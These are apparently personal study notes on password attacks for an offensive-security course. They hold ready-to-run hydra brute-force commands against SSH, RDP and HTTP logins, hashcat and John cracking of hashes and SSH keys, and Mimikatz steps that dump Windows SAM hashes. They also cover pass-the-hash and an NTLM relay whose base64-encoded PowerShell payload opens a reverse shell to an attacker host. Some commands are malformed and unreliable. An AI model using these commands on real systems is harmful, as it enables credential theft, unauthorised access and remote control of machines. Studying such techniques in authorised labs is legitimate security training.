### Chapter 15: Password Attacks









		Although there are many moder approaches to user account and service authentication, such as biometric authentication or Public Key Infrastructure, simple password authentication remains the most dominant and basic approach.
		
		Here is an example of using hydra to brute force an SSH login:
		sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
		
		RDP Bruteforce:
		sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p “SuperS3cure1337#” rdp://192.168.50.202
		sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 3389  rdp://192.168.187.202
		
		HTTP Post Bruteforce:
		sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
		
		HTTP Auth Bruteforce:
		hydra -l admin -P /usr/share/wordlists/rockyou.txt  -s 80 -f 192.168.187.201  http-get /path
		
		Rule Based Hash Crack:
		hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -rule.rule --force

		To create a Hydra rule that converts all letters in the password file to uppercase and duplicates each password, you can use the following syntax:
		external:echo ^USER^ ^PASS^ ^PASS^ | tr a-z A-Z >> passwords.txt
		hydra -l admin -P passwords.txt -t 4 -s 80 -f target.com http-get /admin
		
		A rule to make all passwords in password file uppercase and then doubled on each line:
		cat rockyou.txt | tr a-z A-Z >> upper-passwords.txt
		sed 's/.*/&\&/' file.txt > newfile.txt
		
		Crack SSH id_rsa:
		ssh2john id_rsa > ssh.hash
		hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
		or
		john --wordlist=ssh.passwords --rules=sshRules ssh.hash
		
		Encryption
		
		Encrypted data is known as a ciphertext.
		Symmetric encryption algorithms use the same key for both ecryption and decryption. AES is an example of a symmetric encryption algorith.
		Asymmetric encryption uses distinct key pairs containing private and public keys. Ech user in this transaction has their own key pair. To receive an encrypted message, a user provides their public key to the commuication partner, which they use to encrypt their message for us. A common asymmetric encryption algorith is RSA.
		A hash or digest is the result of runnning variable sized input data through a hash algorith such as SHA1 or MD5.
		The result is a practically unique fixed length hexadecimal vulue that represents the original plaintext. The exception to this is the extremely rare hash collision.
		
		JtR uses CPU. hashcat uses GPU.
		
		Password List Mutation
		To add a “1” to all passwrods in a dictionary:
		echo \$1 > demo.rule
		hashcat -r demo.rule --stdout demo.txt
		Use sed to Append:
		sed 's/$/137#/' passwords.txt >> modified.txt
		sed to capitilize:
		sed 's/^\(.\)/\U\1/' example.txt > modified.txt

		
	Cracking Methodology
	> Extract Hashes
		could be dumped from a db
	> Format hashes
		need to know the hashing algorith used to create the hash by using hashid
	> Calculate Cracking Time
	> Prepare Wordlist
		Create rules 
	> Attack the Hash
	
Cracking NTLM
 NTLM hashes are not salted.
 We can use Mimikatz to interact with the SAM database.
 Mimikatz can also extract passwords from LSASS, as long as admin privileges are granted and the the SeDebugPrivilege accesss right is enabled.
 PsExec and Mimikatz's token elevation function can elevate to the required privileges.
 
 First use PS to check the existing users:
 PS > Get-LocalUser
 Then, in mimikatz:
	 privilege::debug
	 token::elevate
	lsadump::sam
	
Finally, crack the hashes that were obtained:
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 Passing NTLM
 	PtH allows us to autenticate to a host with a valid combination of a username and hash rather than a plaintext password.
 
 Note:
 This is possible because NTLM/LM password hashes are not salted and remain static between sessions. Moreover, if we discover a password hash on one target, we can use it to not only authenticate to that target, but to another target as well, as long as the second target has an account with the same username and password. To leverage this into code execution of any kind, the account also needs administrative privileges on the second target.
 
 If we don't use the local Administrator account, and instead use another account in the local administrator group, we won't be able to run any software with admin rights on a remote system because of UAC. So it needs to be the local Administrator account.
 
 
 Cracking Net-NTLMv2
 Use the responder tool to connect from the windows machine (e.g. after an attack vector involving dropping a bind shell) and obtain a hash.
 
 hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
 
  Passing Net-NTLMv2
  
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.224.212 -c "powershell -EncodedCommand JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgnMTkyLjE2OC40NS4yMjQnLDgwMDApOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICIuIHsgJGRhdGEgfSAyPiYxIiB8IE91dC1TdHJpbmcgKTsgJHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk="

Set-Content -Path C:\Users\anastasia\Desktop\hi.txt -Value “hello”
  
  Use UTF-16LE base64 encoding for powershell.
  
  
  sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.224.212 -c “powershell -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA0ACcALAA4ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAiAC4AIAB7ACAAJABkAGEAdABhACAAfQAgADIAPgAmADEAIgAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==”
  
  
  

